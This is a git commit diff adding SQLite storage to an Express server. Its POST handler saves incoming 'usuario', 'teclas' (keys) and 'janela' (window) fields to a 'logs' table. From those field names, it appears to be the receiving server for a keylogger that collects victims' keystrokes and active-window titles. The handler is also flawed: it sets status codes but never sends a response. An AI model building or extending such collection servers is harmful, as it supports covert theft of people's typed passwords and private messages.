0a51daba3db44993e653009001b498d6db11652a
BrunoFrad <brunfradrib@gmail.com>
2026-08-02 22:33:02 -0300

    feat: add sqlite integration

--- server.js
+++ server.js
@@ -1,4 +1,5 @@
 import express from "express";
+import Database from "better-sqlite3";
 
 const PORT = process.argv[2];
 
@@ -10,6 +11,21 @@ server.get('/', (req, res) => {
 });
 
 server.post('/', (req, res) => {
+    const db = new Database("seraphim.db");
+    db.exec(`CREATE TABLE IF NOT EXISTS logs (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT NOT NULL,
+    payload_content TEXT NOT NULL,
+    window TEXT NOT NULL
+  )`);
+
+    const insertPayload = db.prepare(`INSERT INTO logs (username, payload_content, window) VALUES (?, ?, ?)`);
+
+    try {
+        insertPayload.run(req.body.usuario, req.body.teclas.trimEnd(), req.body.janela);
+    } catch (error) {
+        res.status(500);
+    }
     res.status(200);
 });
 
